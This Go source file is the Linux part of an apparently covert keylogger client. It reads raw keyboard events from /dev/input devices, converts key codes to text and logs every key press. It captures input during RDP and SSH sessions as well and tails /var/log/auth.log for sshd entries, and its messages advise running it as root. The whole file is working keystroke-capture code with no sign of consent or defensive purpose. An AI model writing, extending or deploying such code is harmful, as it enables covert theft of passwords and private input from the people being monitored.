//go:build linux
// +build linux

package client

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

const (
	EV_KEY    = 0x01
	EV_SYN    = 0x00
	KEY_PRESS = 1
)

// InputEvent represents a Linux input event
type InputEvent struct {
	Time  syscall.Timeval
	Type  uint16
	Code  uint16
	Value int32
}

// startPlatformMonitor starts Linux-specific keyboard monitoring
func (kl *Keylogger) startPlatformMonitor() error {
	// Find keyboard input devices
	devices, err := findKeyboardDevices()
	if err != nil {
		return fmt.Errorf("failed to find keyboard devices: %v", err)
	}

	if len(devices) == 0 {
		return fmt.Errorf("no keyboard devices found")
	}

	log.Printf("Found %d keyboard device(s): %v", len(devices), devices)

	// Monitor all keyboard devices
	for _, device := range devices {
		go kl.monitorDevice(device)
	}

	return nil
}

// findKeyboardDevices finds all keyboard input devices
func findKeyboardDevices() ([]string, error) {
	var devices []string

	// Check /dev/input/event* devices
	eventDevices, err := filepath.Glob("/dev/input/event*")
	if err != nil {
		return nil, err
	}

	for _, device := range eventDevices {
		// Check if it's a keyboard device
		if isKeyboardDevice(device) {
			devices = append(devices, device)
		}
	}

	return devices, nil
}

// isKeyboardDevice checks if a device is a keyboard
func isKeyboardDevice(devicePath string) bool {
	// Read device name from /sys/class/input
	eventNum := filepath.Base(devicePath)
	namePath := fmt.Sprintf("/sys/class/input/%s/device/name", eventNum)

	data, err := os.ReadFile(namePath)
	if err != nil {
		return false
	}

	name := strings.ToLower(strings.TrimSpace(string(data)))

	// Check if name contains keyboard-related keywords
	keywords := []string{"keyboard", "kbd", "key"}
	for _, keyword := range keywords {
		if strings.Contains(name, keyword) {
			return true
		}
	}

	return false
}

// monitorDevice monitors a specific input device
func (kl *Keylogger) monitorDevice(devicePath string) {
	log.Printf("Monitoring device: %s", devicePath)

	// Open device
	file, err := os.Open(devicePath)
	if err != nil {
		log.Printf("Failed to open device %s: %v (try running with sudo)", devicePath, err)
		return
	}
	defer file.Close()

	// Read events
	reader := bufio.NewReader(file)
	event := InputEvent{}
	eventSize := binary.Size(event)
	buf := make([]byte, eventSize)

	for {
		select {
		case <-kl.stopChan:
			log.Printf("Stopped monitoring device: %s", devicePath)
			return
		default:
			// Read event
			n, err := reader.Read(buf)
			if err != nil {
				log.Printf("Error reading from %s: %v", devicePath, err)
				return
			}

			if n == eventSize {
				// Parse event
				err = binary.Read(bytes.NewReader(buf), binary.LittleEndian, &event)
				if err != nil {
					continue
				}

				// Process key press events
				if event.Type == EV_KEY && event.Value == KEY_PRESS {
					keyName := getLinuxKeyName(event.Code)
					kl.logKeys(keyName)
				}
			}
		}
	}
}

// getLinuxKeyName converts Linux key code to readable string
func getLinuxKeyName(code uint16) string {
	// Linux key codes mapping
	keyNames := map[uint16]string{
		1: "[ESC]", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
		12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]",
		16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
		26: "[", 27: "]", 28: "[ENTER]", 29: "[CTRL]",
		30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k", 38: "l",
		39: ";", 40: "'", 41: "`", 42: "[SHIFT]", 43: "\\",
		44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
		51: ",", 52: ".", 53: "/", 54: "[RIGHT SHIFT]",
		55: "[KP_*]", 56: "[ALT]", 57: " ", 58: "[CAPS LOCK]",
		59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]",
		64: "[F6]", 65: "[F7]", 66: "[F8]", 67: "[F9]", 68: "[F10]",
		69: "[NUM LOCK]", 70: "[SCROLL LOCK]",
		71: "[KP_7]", 72: "[KP_8]", 73: "[KP_9]", 74: "[KP_-]",
		75: "[KP_4]", 76: "[KP_5]", 77: "[KP_6]", 78: "[KP_+]",
		79: "[KP_1]", 80: "[KP_2]", 81: "[KP_3]", 82: "[KP_0]", 83: "[KP_.]",
		87: "[F11]", 88: "[F12]",
		96: "[KP_ENTER]", 97: "[RIGHT CTRL]", 98: "[KP_/]", 99: "[PRINT SCREEN]", 100: "[RIGHT ALT]",
		102: "[HOME]", 103: "[UP]", 104: "[PAGE UP]", 105: "[LEFT]", 106: "[RIGHT]",
		107: "[END]", 108: "[DOWN]", 109: "[PAGE DOWN]", 110: "[INSERT]", 111: "[DELETE]",
		125: "[LEFT WIN]", 126: "[RIGHT WIN]", 127: "[MENU]",
	}

	if name, ok := keyNames[code]; ok {
		return name
	}

	return fmt.Sprintf("[KEY_%d]", code)
}

// monitorRDP monitors RDP sessions on Linux (via xrdp)
func (kl *Keylogger) monitorRDP() {
	log.Printf("RDP monitoring started (Linux)")

	// On Linux, keyboard monitoring works the same for console and xrdp
	err := kl.startPlatformMonitor()
	if err != nil {
		log.Printf("Failed to start RDP monitoring: %v", err)
		log.Printf("Note: You may need to run with sudo to access input devices")
		return
	}

	// Keep the goroutine alive
	<-kl.stopChan
}

// monitorGeneral provides general keyboard monitoring on Linux
func (kl *Keylogger) monitorGeneral() {
	log.Printf("General keyboard monitoring started (Linux)")
	log.Printf("Note: This requires read access to /dev/input/event* devices")
	log.Printf("You may need to run as root or add user to 'input' group")

	err := kl.startPlatformMonitor()
	if err != nil {
		log.Printf("Failed to start keyboard monitoring: %v", err)
		return
	}

	// Keep the goroutine alive
	<-kl.stopChan
}

// monitorSSH monitors SSH sessions on Linux
func (kl *Keylogger) monitorSSH() {
	log.Printf("SSH monitoring started (Linux)")

	// Monitor auth log for SSH sessions
	go kl.monitorLogFile("/var/log/auth.log")

	// Also start general keyboard monitoring for active sessions
	err := kl.startPlatformMonitor()
	if err != nil {
		log.Printf("Keyboard monitoring not available: %v", err)
	}

	// Keep the goroutine alive
	<-kl.stopChan
}

// monitorLogFile monitors a log file for changes
func (kl *Keylogger) monitorLogFile(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		log.Printf("Failed to open log file %s: %v", filename, err)
		return
	}
	defer file.Close()

	// Seek to end of file
	file.Seek(0, os.SEEK_END)

	scanner := bufio.NewScanner(file)
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-kl.stopChan:
			return
		case <-ticker.C:
			for scanner.Scan() {
				line := scanner.Text()
				if line != "" && strings.Contains(line, "sshd") {
					kl.logKeys(line)
				}
			}
		}
	}
}
